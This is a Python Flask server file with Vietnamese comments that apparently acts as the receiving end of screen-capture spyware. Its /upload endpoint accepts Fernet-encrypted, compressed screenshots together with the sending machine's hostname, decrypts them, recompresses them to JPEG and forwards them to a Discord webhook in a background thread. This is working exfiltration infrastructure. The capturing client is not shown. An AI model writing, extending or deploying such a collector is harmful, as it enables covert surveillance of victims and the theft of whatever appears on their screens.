from flask import Flask, request, jsonify
import os
import zlib
import base64
from datetime import datetime
import requests
from cryptography.fernet import Fernet
from dotenv import load_dotenv
import threading
import io
from PIL import Image

# Load biến môi trường
load_dotenv()
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
FERNET_KEY = os.getenv("FERNET_KEY")

app = Flask(__name__)
fernet = Fernet(FERNET_KEY)
session = requests.Session()

def decrypt_and_decompress(data_base64: str) -> bytes:
    encrypted_data = base64.b64decode(data_base64)
    decrypted = fernet.decrypt(encrypted_data)
    return zlib.decompress(decrypted)

def optimize_image(img_bytes: bytes) -> bytes:
    """Chuyển PNG sang JPEG nén, resize nếu cần"""
    with Image.open(io.BytesIO(img_bytes)) as img:
        # Resize nếu rộng hoặc cao lớn hơn 1280px
        max_dim = 1280
        if max(img.size) > max_dim:
            img.thumbnail((max_dim, max_dim))

        # Chuyển sang RGB (JPEG không hỗ trợ alpha)
        if img.mode in ("RGBA", "P"):
            img = img.convert("RGB")

        output = io.BytesIO()
        img.save(output, format="JPEG", quality=60, optimize=True)
        return output.getvalue()

def send_to_discord_memory_async(filename, img_bytes):
    def task():
        files = {"file": (filename, io.BytesIO(img_bytes), "image/jpeg")}
        data = {"content": f"🖼 Ảnh đã nén: `{filename}`"}
        try:
            res = session.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=5)
            print(f"[Discord] Status: {res.status_code}")
        except Exception as e:
            print(f"[!] Lỗi gửi Discord: {e}")
    threading.Thread(target=task, daemon=True).start()

@app.route("/", methods=["GET"])
def home():
    return "Server hoạt động", 200

@app.route("/upload", methods=["POST"])
def upload():
    try:
        content = request.get_json()
        sys_info = content["system_info"]
        image_enc = content["screenshot"]

        # Giải mã & giải nén
        raw_image = decrypt_and_decompress(image_enc)

        # Nén ảnh tối ưu
        compressed_image = optimize_image(raw_image)

        # Tạo tên file
        filename = f"{sys_info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"

        # Gửi về Discord
        send_to_discord_memory_async(filename, compressed_image)

        return jsonify({"status": "success", "filename": filename})
    except Exception as e:
        print(f"[!] Upload Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
